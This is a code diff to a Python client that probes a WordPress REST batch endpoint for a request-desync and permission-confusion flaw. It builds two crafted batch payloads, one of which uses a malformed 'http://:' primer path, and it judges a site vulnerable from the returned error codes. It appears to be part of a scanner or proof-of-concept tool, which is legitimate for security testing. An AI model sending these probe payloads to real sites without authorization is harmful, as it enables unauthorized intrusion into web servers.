@@ -185,20 +185,37 @@ class Client:
         return body if isinstance(body, list) else None
 
     def confusion(self):
-        r = self.post({"requests": [
-            PRIMER,
-            {"method": "POST", "path": "/wp/v2/posts"},
-            {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
-            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
-        ]})
+        """Try both known probe shapes; the desync is proven when a
+        sub-request after a parse-failed primer answers with the next
+        handler's permission error (block_cannot_read)."""
         codes = set()
-        try:
-            self._walk(r.json(), codes)
-        except Exception:
-            pass
+        probes = [
+            # shape A: archive block-renderer as the desync victim
+            [
+                PRIMER,
+                {"method": "POST", "path": "/wp/v2/posts"},
+                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
+                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
+            ],
+            # shape B: Hadrian probe - http://: primer + category delete victim
+            [
+                {"method": "POST", "path": "http://:"},
+                {"method": "DELETE", "path": "/wp/v2/categories/0"},
+                {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
+            ],
+        ]
+        for probe in probes:
+            r = self.post({"requests": probe})
+            try:
+                self._walk(r.json(), codes)
+            except Exception:
+                pass
         if DEBUG:
             log("[d] confusion codes:", sorted(codes))
-        return all(c in codes for c in MARKER_CODES), codes
+        # parse_path_failed proves the primer desynced; block_cannot_read
+        # proves a request was dispatched against the wrong (block-renderer)
+        # permission callback = vulnerable core.
+        return ("parse_path_failed" in codes and "block_cannot_read" in codes), codes
 
     def _walk(self, v, out):
         if isinstance(v, dict):
